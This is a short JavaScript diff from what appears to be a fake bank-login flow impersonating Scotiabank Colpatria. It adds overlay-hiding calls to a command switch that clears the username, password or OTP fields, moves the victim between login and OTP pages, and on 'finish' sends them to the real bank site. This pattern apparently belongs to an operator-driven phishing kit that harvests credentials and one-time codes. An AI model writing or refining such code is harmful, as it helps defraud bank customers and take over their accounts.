@@ -19,6 +19,7 @@
                     document.getElementById('username').value = '';
                     document.getElementById('password').value = '';
                 } else {
+                    BancoUtils.hideOverlay();
                     window.location.href = 'index.html';
                 }
                 break;
@@ -26,10 +27,12 @@
                 if (window.location.pathname.includes('otp.html')) {
                     document.getElementById('otp').value = '';
                 } else {
+                    BancoUtils.hideOverlay();
                     window.location.href = 'otp.html';
                 }
                 break;
             case 'finish': 
+                BancoUtils.hideOverlay();
                 window.location.href = 'https://www.scotiabankcolpatria.com/';
                 break;
         }
